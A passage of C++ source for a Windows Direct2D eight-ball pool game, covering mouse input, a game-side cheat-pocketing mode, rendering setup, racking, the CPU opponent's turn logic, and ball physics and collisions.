                currentGameState == PRE_BREAK_PLACEMENT);

            // Check Spin Indicator first (Allow if player's turn/aim phase)
            if (canPlayerClickInteract && canInteractState) {
                float spinDistSq = GetDistanceSq((float)ptMouse.x, (float)ptMouse.y, spinIndicatorCenter.x, spinIndicatorCenter.y);
                if (spinDistSq < spinIndicatorRadius * spinIndicatorRadius * 1.2f) {
                    isSettingEnglish = true;
                    float dx = (float)ptMouse.x - spinIndicatorCenter.x;
                    float dy = (float)ptMouse.y - spinIndicatorCenter.y;
                    float dist = GetDistance(dx, dy, 0, 0);
                    if (dist > spinIndicatorRadius) { dx *= spinIndicatorRadius / dist; dy *= spinIndicatorRadius / dist; }
                    cueSpinX = dx / spinIndicatorRadius;
                    cueSpinY = dy / spinIndicatorRadius;
                    isAiming = false; isDraggingStick = false; isDraggingCueBall = false;
                    return 0;
                }
            }

            if (!cueBall) return 0;

            // Check Ball-in-Hand placement/drag
            bool isPlacingBall = (currentGameState == BALL_IN_HAND_P1 || currentGameState == BALL_IN_HAND_P2 || currentGameState == PRE_BREAK_PLACEMENT);
            bool isPlayerAllowedToPlace = (isPlacingBall &&
                ((currentPlayer == 1 && currentGameState == BALL_IN_HAND_P1) ||
                    (currentPlayer == 2 && !isPlayer2AI && currentGameState == BALL_IN_HAND_P2) ||
                    (currentGameState == PRE_BREAK_PLACEMENT))); // Allow current player in break setup

            if (isPlayerAllowedToPlace) {
                float distSq = GetDistanceSq(cueBall->x, cueBall->y, (float)ptMouse.x, (float)ptMouse.y);
                if (distSq < BALL_RADIUS * BALL_RADIUS * 9.0f) {
                    isDraggingCueBall = true;
                    isAiming = false; isDraggingStick = false;
                }
                else {
                    bool behindHeadstring = (currentGameState == PRE_BREAK_PLACEMENT);
                    if (IsValidCueBallPosition((float)ptMouse.x, (float)ptMouse.y, behindHeadstring)) {
                        cueBall->x = (float)ptMouse.x; cueBall->y = (float)ptMouse.y;
                        cueBall->vx = 0; cueBall->vy = 0;
                        isDraggingCueBall = false;
                        // Transition state
                        if (currentGameState == PRE_BREAK_PLACEMENT) currentGameState = BREAKING;
                        else if (currentGameState == BALL_IN_HAND_P1) currentGameState = PLAYER1_TURN;
                        else if (currentGameState == BALL_IN_HAND_P2) currentGameState = PLAYER2_TURN;
                        cueAngle = 0.0f;
                    }
                }
                return 0;
            }

            // Check for starting Aim (Cue Ball OR Stick)
            bool canAim = ((currentPlayer == 1 && (currentGameState == PLAYER1_TURN || currentGameState == BREAKING)) ||
                (currentPlayer == 2 && !isPlayer2AI && (currentGameState == PLAYER2_TURN || currentGameState == BREAKING)));

            if (canAim) {
                const float stickDrawLength = 150.0f * 1.4f;
                float currentStickAngle = cueAngle + PI;
                D2D1_POINT_2F currentStickEnd = D2D1::Point2F(cueBall->x + cosf(currentStickAngle) * stickDrawLength, cueBall->y + sinf(currentStickAngle) * stickDrawLength);
                D2D1_POINT_2F currentStickTip = D2D1::Point2F(cueBall->x + cosf(currentStickAngle) * 5.0f, cueBall->y + sinf(currentStickAngle) * 5.0f);
                float distToStickSq = PointToLineSegmentDistanceSq(D2D1::Point2F((float)ptMouse.x, (float)ptMouse.y), currentStickTip, currentStickEnd);
                float stickClickThresholdSq = 36.0f;
                float distToCueBallSq = GetDistanceSq(cueBall->x, cueBall->y, (float)ptMouse.x, (float)ptMouse.y);
                float cueBallClickRadiusSq = BALL_RADIUS * BALL_RADIUS * 25;

                bool clickedStick = (distToStickSq < stickClickThresholdSq);
                bool clickedCueArea = (distToCueBallSq < cueBallClickRadiusSq);

                if (clickedStick || clickedCueArea) {
                    isDraggingStick = clickedStick && !clickedCueArea;
                    isAiming = clickedCueArea;
                    aimStartPoint = D2D1::Point2F((float)ptMouse.x, (float)ptMouse.y);
                    shotPower = 0;
                    float dx = (float)ptMouse.x - cueBall->x;
                    float dy = (float)ptMouse.y - cueBall->y;
                    if (dx != 0 || dy != 0) cueAngle = atan2f(dy, dx);
                    if (currentGameState != BREAKING) currentGameState = AIMING;
                }
            }
            return 0;
        } // End WM_LBUTTONDOWN


        case WM_LBUTTONUP: {
            // --- FOOLPROOF FIX for Cheat Mode Scoring ---
            if (cheatModeEnabled && draggingBallId != -1) {
                Ball* b = GetBallById(draggingBallId);
                if (b) {
                    for (int p = 0; p < 6; ++p) {
                        float dx = b->x - pocketPositions[p].x;
                        float dy = b->y - pocketPositions[p].y;
                        if (dx * dx + dy * dy <= POCKET_RADIUS * POCKET_RADIUS) {
                            // --- This is the new, ""smarter"" logic ---
                            b->isPocketed = true; // Pocket the ball visually.

                            // If the table is open, assign types based on this cheated ball.
                            if (player1Info.assignedType == BallType::NONE && b->id != 0 && b->id != 8) {
                                AssignPlayerBallTypes(b->type, false);
                            }

                            // Now, correctly update the score for the right player.
                            if (b->id != 0 && b->id != 8) {
                                if (b->type == player1Info.assignedType) {
                                    player1Info.ballsPocketedCount++;
                                }
                                else if (b->type == player2Info.assignedType) {
                                    player2Info.ballsPocketedCount++;
                                }
                            }
                            break; // Stop checking pockets.
                        }
                    }
                }
            }

            /*if (cheatModeEnabled && draggingBallId != -1) {
                Ball* b = GetBallById(draggingBallId);
                if (b) {
                    for (int p = 0; p < 6; ++p) {
                        float dx = b->x - pocketPositions[p].x;
                        float dy = b->y - pocketPositions[p].y;
                        if (dx * dx + dy * dy <= POCKET_RADIUS * POCKET_RADIUS) {
                            // --- Assign ball type on first cheat-pocket if table still open ---
                            if (player1Info.assignedType == BallType::NONE
                                && player2Info.assignedType == BallType::NONE
                                && (b->type == BallType::SOLID || b->type == BallType::STRIPE))
                            {
                                // In cheat mode, let's just assign to the current player
                                AssignPlayerBallTypes(b->type);
                            }
                            b->isPocketed = true;
                            pocketedThisTurn.push_back(b->id);

                            // --- FIX FOR CHEAT MODE SCORING ---
                            // Immediately increment the correct player's count based on ball type,
                            // not whose turn it is.
                            if (b->id != 0 && b->id != 8) {
                                if (b->type == player1Info.assignedType) {
                                    player1Info.ballsPocketedCount++;
                                }
                                else if (b->type == player2Info.assignedType) {
                                    player2Info.ballsPocketedCount++;
                                }
                            }
                            // --- END FIX ---
                            // --- NEW: If this was the 7th ball, trigger the arrow call UI ---
                            if (b->id != 8) {
                                PlayerInfo& shooter = (currentPlayer == 1 ? player1Info : player2Info);
                                if (shooter.ballsPocketedCount >= 7
                                    && calledPocketP1 < 0
                                    && calledPocketP2 < 0)
                                {
                                    currentGameState = (currentPlayer == 1)
                                        ? CHOOSING_POCKET_P1
                                        : CHOOSING_POCKET_P2;
                                }
                                else {
                                    // For any other cheat?pocket, keep the turn so you can continue aiming
                                    currentGameState = (currentPlayer == 1)
                                        ? PLAYER1_TURN
                                        : PLAYER2_TURN;
                                }
                            }
                            // --- NEW: If it was the 8-Ball, award instant victory ---
                            else {
                                currentGameState = GAME_OVER;
                                gameOverMessage = (currentPlayer == 1 ? player1Info.name : player2Info.name)
                                    + std::wstring(L"" Wins!"");
                            }
                            break;
                        }
                    }
                }
            }*/

            ptMouse.x = LOWORD(lParam);
            ptMouse.y = HIWORD(lParam);

            Ball* cueBall = GetCueBall(); // Get cueBall pointer

            // Check for releasing aim drag (Stick OR Cue Ball)
            if ((isAiming || isDraggingStick) &&
                ((currentPlayer == 1 && (currentGameState == AIMING || currentGameState == BREAKING)) ||
                    (!isPlayer2AI && currentPlayer == 2 && (currentGameState == AIMING || currentGameState == BREAKING))))
            {
                bool wasAiming = isAiming;
                bool wasDraggingStick = isDraggingStick;
                isAiming = false; isDraggingStick = false;

                if (shotPower > 0.15f) { // Check power threshold
                    if (currentGameState != AI_THINKING) {
                        firstHitBallIdThisShot = -1; cueHitObjectBallThisShot = false; railHitAfterContact = false; // Reset foul flags
                        std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""cue.wav"")).detach();
                        ApplyShot(shotPower, cueAngle, cueSpinX, cueSpinY);
                        currentGameState = SHOT_IN_PROGRESS;
                        foulCommitted = false; pocketedThisTurn.clear();
                    }
                }
                else if (currentGameState != AI_THINKING) { // Revert state if power too low
                    if (currentGameState == BREAKING) { /* Still breaking */ }
                    else {
                        currentGameState = (currentPlayer == 1) ? PLAYER1_TURN : PLAYER2_TURN;
                        if (currentPlayer == 2 && isPlayer2AI) aiTurnPending = false;
                    }
                }
                shotPower = 0; // Reset power indicator regardless
            }

            // Handle releasing cue ball drag (placement)
            if (isDraggingCueBall) {
                isDraggingCueBall = false;
                // Check player allowed to place
                bool isPlacingState = (currentGameState == BALL_IN_HAND_P1 || currentGameState == BALL_IN_HAND_P2 || currentGameState == PRE_BREAK_PLACEMENT);
                bool isPlayerAllowed = (isPlacingState &&
                    ((currentPlayer == 1 && currentGameState == BALL_IN_HAND_P1) ||
                        (currentPlayer == 2 && !isPlayer2AI && currentGameState == BALL_IN_HAND_P2) ||
                        (currentGameState == PRE_BREAK_PLACEMENT)));

                if (isPlayerAllowed && cueBall) {
                    bool behindHeadstring = (currentGameState == PRE_BREAK_PLACEMENT);
                    if (IsValidCueBallPosition(cueBall->x, cueBall->y, behindHeadstring)) {
                        // Finalize position already set by mouse move
                        // Transition state
                        if (currentGameState == PRE_BREAK_PLACEMENT) currentGameState = BREAKING;
                        else if (currentGameState == BALL_IN_HAND_P1) currentGameState = PLAYER1_TURN;
                        else if (currentGameState == BALL_IN_HAND_P2) currentGameState = PLAYER2_TURN;
                        cueAngle = 0.0f;
                        /* ----------------------------------------------------
                        If the player who now has the turn is already on the
                        8-ball, immediately switch to pocket-selection state.
                        ---------------------------------------------------- */
                        if (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN)
                        {
                            CheckAndTransitionToPocketChoice(currentPlayer);
                        }
                    }
                    else { /* Stay in BALL_IN_HAND state if final pos invalid */ }
                }
            }

            // Handle releasing english setting
            if (isSettingEnglish) {
                isSettingEnglish = false;
            }
            return 0;
        } // End WM_LBUTTONUP

        case WM_DESTROY:
            isMusicPlaying = false;
            if (midiDeviceID != 0) {
                mciSendCommand(midiDeviceID, MCI_CLOSE, 0, NULL);
                midiDeviceID = 0;
                SaveSettings(); // Save settings on exit
            }
            PostQuitMessage(0);
            return 0;

        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
        }
        return 0;
    }

    // --- Direct2D Resource Management ---

    HRESULT CreateDeviceResources() {
        HRESULT hr = S_OK;

        // Create Direct2D Factory
        if (!pFactory) {
            hr = D2D1CreateFactory(D2D1_FACTORY_TYPE_SINGLE_THREADED, &pFactory);
            if (FAILED(hr)) return hr;
        }

        // Create DirectWrite Factory
        if (!pDWriteFactory) {
            hr = DWriteCreateFactory(
                DWRITE_FACTORY_TYPE_SHARED,
                __uuidof(IDWriteFactory),
                reinterpret_cast<IUnknown**>(&pDWriteFactory)
            );
            if (FAILED(hr)) return hr;
        }

        // Create Text Formats
        if (!pTextFormat && pDWriteFactory) {
            hr = pDWriteFactory->CreateTextFormat(
                L""Segoe UI"", NULL, DWRITE_FONT_WEIGHT_NORMAL, DWRITE_FONT_STYLE_NORMAL, DWRITE_FONT_STRETCH_NORMAL,
                16.0f, L""en-us"", &pTextFormat
            );
            if (FAILED(hr)) return hr;
            // Center align text
            pTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_CENTER);
            pTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);
        }
        if (!pLargeTextFormat && pDWriteFactory) {
            hr = pDWriteFactory->CreateTextFormat(
                L""Impact"", NULL, DWRITE_FONT_WEIGHT_BOLD, DWRITE_FONT_STYLE_NORMAL, DWRITE_FONT_STRETCH_NORMAL,
                48.0f, L""en-us"", &pLargeTextFormat
            );
            if (FAILED(hr)) return hr;
            pLargeTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_LEADING); // Align left
            pLargeTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);
        }


        // Create Render Target (needs valid hwnd)
        if (!pRenderTarget && hwndMain) {
            RECT rc;
            GetClientRect(hwndMain, &rc);
            D2D1_SIZE_U size = D2D1::SizeU(rc.right - rc.left, rc.bottom - rc.top);

            hr = pFactory->CreateHwndRenderTarget(
                D2D1::RenderTargetProperties(),
                D2D1::HwndRenderTargetProperties(hwndMain, size),
                &pRenderTarget
            );
            if (FAILED(hr)) {
                // If failed, release factories if they were created in this call
                SafeRelease(&pTextFormat);
                SafeRelease(&pLargeTextFormat);
                SafeRelease(&pDWriteFactory);
                SafeRelease(&pFactory);
                pRenderTarget = nullptr; // Ensure it's null on failure
                return hr;
            }
        }

        return hr;
    }

    void DiscardDeviceResources() {
        SafeRelease(&pRenderTarget);
        SafeRelease(&pTextFormat);
        SafeRelease(&pLargeTextFormat);
        SafeRelease(&pDWriteFactory);
        // Keep pFactory until application exit? Or release here too? Let's release.
        SafeRelease(&pFactory);
    }

    void OnResize(UINT width, UINT height) {
        if (pRenderTarget) {
            D2D1_SIZE_U size = D2D1::SizeU(width, height);
            pRenderTarget->Resize(size); // Ignore HRESULT for simplicity here
        }
    }

    // --- Game Initialization ---
    void InitGame() {
        srand((unsigned int)time(NULL)); // Seed random number generator
        isOpeningBreakShot = true; // This is the start of a new game, so the next shot is an opening break.
        aiPlannedShotDetails.isValid = false; // Reset AI planned shot
        aiIsDisplayingAim = false;
        aiAimDisplayFramesLeft = 0;
        // ... (rest of InitGame())

        // --- Ensure pocketed list is clear from the absolute start ---
        pocketedThisTurn.clear();

        balls.clear(); // Clear existing balls

        // Reset Player Info (Names should be set by Dialog/wWinMain/ResetGame)
        player1Info.assignedType = BallType::NONE;
        player1Info.ballsPocketedCount = 0;
        // Player 1 Name usually remains ""Player 1""
        player2Info.assignedType = BallType::NONE;
        player2Info.ballsPocketedCount = 0;
        // Player 2 Name is set based on gameMode in ShowNewGameDialog
            // --- Reset any 8?Ball call state on new game ---
        lastEightBallPocketIndex = -1;
        calledPocketP1 = -1;
        calledPocketP2 = -1;
        pocketCallMessage = L"""";
        aiPlannedShotDetails.isValid = false; // THIS IS THE CRITICAL FIX: Reset the AI's plan.

        // Create Cue Ball (ID 0)
        // Initial position will be set during PRE_BREAK_PLACEMENT state
        balls.push_back({ 0, BallType::CUE_BALL, TABLE_LEFT + TABLE_WIDTH * 0.15f, RACK_POS_Y, 0, 0, CUE_BALL_COLOR, false });

        // --- Create Object Balls (Temporary List) ---
        std::vector<Ball> objectBalls;
        // Solids (1-7, Yellow)
        for (int i = 1; i <= 7; ++i) {
            objectBalls.push_back({ i, BallType::SOLID, 0, 0, 0, 0, SOLID_COLOR, false });
        }
        // Stripes (9-15, Red)
        for (int i = 9; i <= 15; ++i) {
            objectBalls.push_back({ i, BallType::STRIPE, 0, 0, 0, 0, STRIPE_COLOR, false });
        }
        // 8-Ball (ID 8) - Add it to the list to be placed
        objectBalls.push_back({ 8, BallType::EIGHT_BALL, 0, 0, 0, 0, EIGHT_BALL_COLOR, false });


        // --- Racking Logic (Improved) ---
        float spacingX = BALL_RADIUS * 2.0f * 0.866f; // cos(30) for horizontal spacing
        float spacingY = BALL_RADIUS * 2.0f * 1.0f;   // Vertical spacing

        // Define rack positions (0-14 indices corresponding to triangle spots)
        D2D1_POINT_2F rackPositions[15];
        int rackIndex = 0;
        for (int row = 0; row < 5; ++row) {
            for (int col = 0; col <= row; ++col) {
                if (rackIndex >= 15) break;
                float x = RACK_POS_X + row * spacingX;
                float y = RACK_POS_Y + (col - row / 2.0f) * spacingY;
                rackPositions[rackIndex++] = D2D1::Point2F(x, y);
            }
        }

        // Separate 8-ball
        Ball eightBall;
        std::vector<Ball> otherBalls; // Solids and Stripes
        bool eightBallFound = false;
        for (const auto& ball : objectBalls) {
            if (ball.id == 8) {
                eightBall = ball;
                eightBallFound = true;
            }
            else {
                otherBalls.push_back(ball);
            }
        }
        // Ensure 8 ball was actually created (should always be true)
        if (!eightBallFound) {
            // Handle error - perhaps recreate it? For now, proceed.
            eightBall = { 8, BallType::EIGHT_BALL, 0, 0, 0, 0, EIGHT_BALL_COLOR, false };
        }


        // Shuffle the other 14 balls
        // Use std::shuffle if available (C++11 and later) for better randomness
        // std::random_device rd;
        // std::mt19937 g(rd());
        // std::shuffle(otherBalls.begin(), otherBalls.end(), g);
        std::random_shuffle(otherBalls.begin(), otherBalls.end()); // Using deprecated for now

        // --- Place balls into the main 'balls' vector in rack order ---
        // Important: Add the cue ball (already created) first.
        // (Cue ball added at the start of the function now)

        // 1. Place the 8-ball in its fixed position (index 4 for the 3rd row center)
        int eightBallRackIndex = 4;
        eightBall.x = rackPositions[eightBallRackIndex].x;
        eightBall.y = rackPositions[eightBallRackIndex].y;
        eightBall.vx = 0;
        eightBall.vy = 0;
        eightBall.isPocketed = false;
        balls.push_back(eightBall); // Add 8 ball to the main vector

        // 2. Place the shuffled Solids and Stripes in the remaining spots
        size_t otherBallIdx = 0;
        //int otherBallIdx = 0;
        for (int i = 0; i < 15; ++i) {
            if (i == eightBallRackIndex) continue; // Skip the 8-ball spot

            if (otherBallIdx < otherBalls.size()) {
                Ball& ballToPlace = otherBalls[otherBallIdx++];
                ballToPlace.x = rackPositions[i].x;
                ballToPlace.y = rackPositions[i].y;
                ballToPlace.vx = 0;
                ballToPlace.vy = 0;
                ballToPlace.isPocketed = false;
                balls.push_back(ballToPlace); // Add to the main game vector
            }
        }
        // --- End Racking Logic ---


        // --- Determine Who Breaks and Initial State ---
        if (isPlayer2AI) {
            /*// AI Mode: Randomly decide who breaks
            if ((rand() % 2) == 0) {
                // AI (Player 2) breaks
                currentPlayer = 2;
                currentGameState = PRE_BREAK_PLACEMENT; // AI needs to place ball first
                aiTurnPending = true; // Trigger AI logic
            }
            else {
                // Player 1 (Human) breaks
                currentPlayer = 1;
                currentGameState = PRE_BREAK_PLACEMENT; // Human places cue ball
                aiTurnPending = false;*/
            switch (openingBreakMode) {
            case CPU_BREAK:
                currentPlayer = 2; // AI breaks
                currentGameState = PRE_BREAK_PLACEMENT;
                aiTurnPending = true;
                break;
            case P1_BREAK:
                currentPlayer = 1; // Player 1 breaks
                currentGameState = PRE_BREAK_PLACEMENT;
                aiTurnPending = false;
                break;
            case FLIP_COIN_BREAK:
                if ((rand() % 2) == 0) { // 0 for AI, 1 for Player 1
                    currentPlayer = 2; // AI breaks
                    currentGameState = PRE_BREAK_PLACEMENT;
                    aiTurnPending = true;
                }
                else {
                    currentPlayer = 1; // Player 1 breaks
                    currentGameState = PRE_BREAK_PLACEMENT;
                    aiTurnPending = false;
                }
                break;
            default: // Fallback to CPU break
                currentPlayer = 2;
                currentGameState = PRE_BREAK_PLACEMENT;
                aiTurnPending = true;
                break;
            }
        }
        else {
            // Human vs Human, Player 1 always breaks (or could add a flip coin for HvsH too if desired)
            currentPlayer = 1;
            currentGameState = PRE_BREAK_PLACEMENT;
            aiTurnPending = false; // No AI involved
        }

        // Reset other relevant game state variables
        foulCommitted = false;
        gameOverMessage = L"""";
        firstBallPocketedAfterBreak = false;
        // pocketedThisTurn cleared at start
        // Reset shot parameters and input flags
        shotPower = 0.0f;
        cueSpinX = 0.0f;
        cueSpinY = 0.0f;
        isAiming = false;
        isDraggingCueBall = false;
        isSettingEnglish = false;
        cueAngle = 0.0f; // Reset aim angle
    }


    // --------------------------------------------------------------------------------
    // Full GameUpdate(): integrates AI call?pocket ? aim ? shoot (no omissions)
    // --------------------------------------------------------------------------------
    void GameUpdate() {
        // --- 1) Handle an in?flight shot ---
        if (currentGameState == SHOT_IN_PROGRESS) {
            UpdatePhysics();
            // ? clear old 8?ball pocket info before any new pocket checks
            //lastEightBallPocketIndex = -1;
            CheckCollisions();
            CheckPockets(); // FIX: This line was missing. It's essential to check for pocketed balls every frame.

            if (AreBallsMoving()) {
                isAiming = false;
                aiIsDisplayingAim = false;
            }

            if (!AreBallsMoving()) {
                ProcessShotResults();
            }
            return;
        }

        // --- 2) CPU’s turn (table is static) ---
        if (isPlayer2AI && currentPlayer == 2 && !AreBallsMoving()) {
            // ??? If we've just auto?entered AI_THINKING for the 8?ball call, actually make the decision ???
            if (currentGameState == AI_THINKING && aiTurnPending) {
                aiTurnPending = false;        // consume the pending flag
                AIMakeDecision();             // CPU calls its pocket or plans its shot
                return;                       // done this tick
            }

            // ??? Automate the AI pocket?selection click ???
            if (currentGameState == CHOOSING_POCKET_P2) {
                // AI immediately confirms its call and moves to thinking/shooting
                currentGameState = AI_THINKING;
                aiTurnPending = true;
                return; // process on next tick
            }
            // 2A) If AI is displaying its aim line, count down then shoot
            if (aiIsDisplayingAim) {
                aiAimDisplayFramesLeft--;
                if (aiAimDisplayFramesLeft <= 0) {
                    aiIsDisplayingAim = false;
                    if (aiPlannedShotDetails.isValid) {
                        firstHitBallIdThisShot = -1;
                        cueHitObjectBallThisShot = false;
                        railHitAfterContact = false;
                        std::thread([](const TCHAR* soundName) {
                            PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT);
                            }, TEXT(""cue.wav"")).detach();

                            ApplyShot(
                                aiPlannedShotDetails.power,
                                aiPlannedShotDetails.angle,
                                aiPlannedShotDetails.spinX,
                                aiPlannedShotDetails.spinY
                            );
                            aiPlannedShotDetails.isValid = false;
                    }
                    currentGameState = SHOT_IN_PROGRESS;
                    foulCommitted = false;
                    pocketedThisTurn.clear();
                }
                return;
            }

            // 2B) Immediately after calling pocket, transition into AI_THINKING
            if (currentGameState == CHOOSING_POCKET_P2 && aiTurnPending) {
                // Start thinking/shooting right away—no human click required
                currentGameState = AI_THINKING;
                aiTurnPending = false;
                AIMakeDecision();
                return;
            }

            // 2C) If AI has pending actions (break, ball?in?hand, or normal turn)
            if (aiTurnPending) {
                if (currentGameState == BALL_IN_HAND_P2) {
                    AIPlaceCueBall();
                    currentGameState = AI_THINKING;
                    aiTurnPending = false;
                    AIMakeDecision();
                }
                else if (isOpeningBreakShot && currentGameState == PRE_BREAK_PLACEMENT) {
                    AIBreakShot();
                }
                else if (currentGameState == PLAYER2_TURN || currentGameState == BREAKING) {
                    currentGameState = AI_THINKING;
                    aiTurnPending = false;
                    AIMakeDecision();
                }
                return;
            }
        }
    }


    // --- Physics and Collision ---
    void UpdatePhysics() {
        for (size_t i = 0; i < balls.size(); ++i) {
            Ball& b = balls[i];
            if (!b.isPocketed) {
                b.x += b.vx;
                b.y += b.vy;

                // Apply friction
                b.vx *= FRICTION;
                b.vy *= FRICTION;

                // Stop balls if velocity is very low
                if (GetDistanceSq(b.vx, b.vy, 0, 0) < MIN_VELOCITY_SQ) {
                    b.vx = 0;
                    b.vy = 0;
                }

                /* -----------------------------------------------------------------
       Additional clamp to guarantee the ball never escapes the table.
       The existing wall–collision code can momentarily disable the
       reflection test while the ball is close to a pocket mouth;
       that rare case allowed it to ‘slide’ through the cushion and
       leave the board.  We therefore enforce a final boundary check
       after the normal physics step.
       ----------------------------------------------------------------- */
                const float leftBound = TABLE_LEFT + BALL_RADIUS;
                const float rightBound = TABLE_RIGHT - BALL_RADIUS;
                const float topBound = TABLE_TOP + BALL_RADIUS;
                const float bottomBound = TABLE_BOTTOM - BALL_RADIUS;

                if (b.x < leftBound) { b.x = leftBound;   b.vx = fabsf(b.vx); }
                if (b.x > rightBound) { b.x = rightBound;  b.vx = -fabsf(b.vx); }
                if (b.y < topBound) { b.y = topBound;    b.vy = fabsf(b.vy); }
                if (b.y > bottomBound) { b.y = bottomBound; b.vy = -fabsf(b.vy); }
            }
        }
    }

    void CheckCollisions() {
        float left = TABLE_LEFT;
        float right = TABLE_RIGHT;
        float top = TABLE_TOP;
        float bottom = TABLE_BOTTOM;
        const float pocketMouthCheckRadiusSq = (POCKET_RADIUS + BALL_RADIUS) * (POCKET_RADIUS + BALL_RADIUS) * 1.1f;

        // --- Reset Per-Frame Sound Flags ---
        bool playedWallSoundThisFrame = false;
        bool playedCollideSoundThisFrame = false;
        // ---

        for (size_t i = 0; i < balls.size(); ++i) {
            Ball& b1 = balls[i];
            if (b1.isPocketed) continue;

            bool nearPocket[6];
            for (int p = 0; p < 6; ++p) {
                nearPocket[p] = GetDistanceSq(b1.x, b1.y, pocketPositions[p].x, pocketPositions[p].y) < pocketMouthCheckRadiusSq;
            }
            bool nearTopLeftPocket = nearPocket[0];
            bool nearTopMidPocket = nearPocket[1];
            bool nearTopRightPocket = nearPocket[2];
            bool nearBottomLeftPocket = nearPocket[3];
            bool nearBottomMidPocket = nearPocket[4];
            bool nearBottomRightPocket = nearPocket[5];

            bool collidedWallThisBall = false;

            // --- Ball-Wall Collisions ---
            // (Check logic unchanged, added sound calls and railHitAfterContact update)
            // Left Wall
            if (b1.x - BALL_RADIUS < left) {
                if (!nearTopLeftPocket && !nearBottomLeftPocket) {
                    b1.x = left + BALL_RADIUS; b1.vx *= -1.0f; collidedWallThisBall = true;
                    if (!playedWallSoundThisFrame) {
                        std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""wall.wav"")).detach();
                        playedWallSoundThisFrame = true;
                    }
                    if (cueHitObjectBallThisShot) railHitAfterContact = true; // Track rail hit after contact
                }
            }
            // Right Wall
            if (b1.x + BALL_RADIUS > right) {
                if (!nearTopRightPocket && !nearBottomRightPocket) {
                    b1.x = right - BALL_RADIUS; b1.vx *= -1.0f; collidedWallThisBall = true;
                    if (!playedWallSoundThisFrame) {
                        std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""wall.wav"")).detach();
                        playedWallSoundThisFrame = true;
                    }
                    if (cueHitObjectBallThisShot) railHitAfterContact = true; // Track rail hit after contact
                }
            }
            // Top Wall
            if (b1.y - BALL_RADIUS < top) {
                if (!nearTopLeftPocket && !nearTopMidPocket && !nearTopRightPocket) {
                    b1.y = top + BALL_RADIUS; b1.vy *= -1.0f; collidedWallThisBall = true;
                    if (!playedWallSoundThisFrame) {
                        std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""wall.wav"")).detach();
                        playedWallSoundThisFrame = true;
                    }
                    if (cueHitObjectBallThisShot) railHitAfterContact = true; // Track rail hit after contact
                }
            }
            // Bottom Wall
            if (b1.y + BALL_RADIUS > bottom) {
                if (!nearBottomLeftPocket && !nearBottomMidPocket && !nearBottomRightPocket) {
                    b1.y = bottom - BALL_RADIUS; b1.vy *= -1.0f; collidedWallThisBall = true;
                    if (!playedWallSoundThisFrame) {
                        std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""wall.wav"")).detach();
                        playedWallSoundThisFrame = true;
                    }
                    if (cueHitObjectBallThisShot) railHitAfterContact = true; // Track rail hit after contact
                }
            }

            // Spin effect (Unchanged)
            if (collidedWallThisBall) {
                if (b1.x <= left + BALL_RADIUS || b1.x >= right - BALL_RADIUS) { b1.vy += cueSpinX * b1.vx * 0.05f; }
                if (b1.y <= top + BALL_RADIUS || b1.y >= bottom - BALL_RADIUS) { b1.vx -= cueSpinY * b1.vy * 0.05f; }
                cueSpinX *= 0.7f; cueSpinY *= 0.7f;
            }


            // --- Ball-Ball Collisions ---
            for (size_t j = i + 1; j < balls.size(); ++j) {
                Ball& b2 = balls[j];
                if (b2.isPocketed) continue;

                float dx = b2.x - b1.x; float dy = b2.y - b1.y;
                float distSq = dx * dx + dy * dy;
                float minDist = BALL_RADIUS * 2.0f;

                if (distSq > 1e-6 && distSq < minDist * minDist) {
                    float dist = sqrtf(distSq);
                    float overlap = minDist - dist;
                    float nx = dx / dist; float ny = dy / dist;

                    // Separation (Unchanged)
                    b1.x -= overlap * 0.5f * nx; b1.y -= overlap * 0.5f * ny;
                    b2.x += overlap * 0.5f * nx; b2.y += overlap * 0.5f * ny;

                    float rvx = b1.vx - b2.vx; float rvy = b1.vy - b2.vy;
                    float velAlongNormal = rvx * nx + rvy * ny;

                    if (velAlongNormal > 0) { // Colliding
                        // --- Play Ball Collision Sound ---
                        if (!playedCollideSoundThisFrame) {
                            std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""poolballhit.wav"")).detach();
                            playedCollideSoundThisFrame = true; // Set flag
                        }
                        // --- End Sound ---

                        // --- NEW: Track First Hit and Cue/Object Collision ---
                        if (firstHitBallIdThisShot == -1) { // If first hit hasn't been recorded yet
                            if (b1.id == 0) { // Cue ball hit b2 first
                                firstHitBallIdThisShot = b2.id;
                                cueHitObjectBallThisShot = true;
                            }
                            else if (b2.id == 0) { // Cue ball hit b1 first
                                firstHitBallIdThisShot = b1.id;
                                cueHitObjectBallThisShot = true;
                            }
                            // If neither is cue ball, doesn't count as first hit for foul purposes
                        }
                        else if (b1.id == 0 || b2.id == 0) {
                            // Track subsequent cue ball collisions with object balls
                            cueHitObjectBallThisShot = true;
                        }
                        // --- End First Hit Tracking ---


                        // Impulse (Unchanged)
                        float impulse = velAlongNormal;
                        b1.vx -= impulse * nx; b1.vy -= impulse * ny;
                        b2.vx += impulse * nx; b2.vy += impulse * ny;

                        // Spin Transfer (Unchanged)
                        if (b1.id == 0 || b2.id == 0) {
                            float spinEffectFactor = 0.08f;
                            b1.vx += (cueSpinY * ny - cueSpinX * nx) * spinEffectFactor;
                            b1.vy += (cueSpinY * nx + cueSpinX * ny) * spinEffectFactor;
                            b2.vx -= (cueSpinY * ny - cueSpinX * nx) * spinEffectFactor;
                            b2.vy -= (cueSpinY * nx + cueSpinX * ny) * spinEffectFactor;
                            cueSpinX *= 0.85f; cueSpinY *= 0.85f;
                        }
                    }
                }
            } // End ball-ball loop
        } // End ball loop
    } // End CheckCollisions


    bool CheckPockets() {
        bool anyPocketed = false;
        // FIX: Declare a local flag to ensure the sound only plays ONCE per function call.
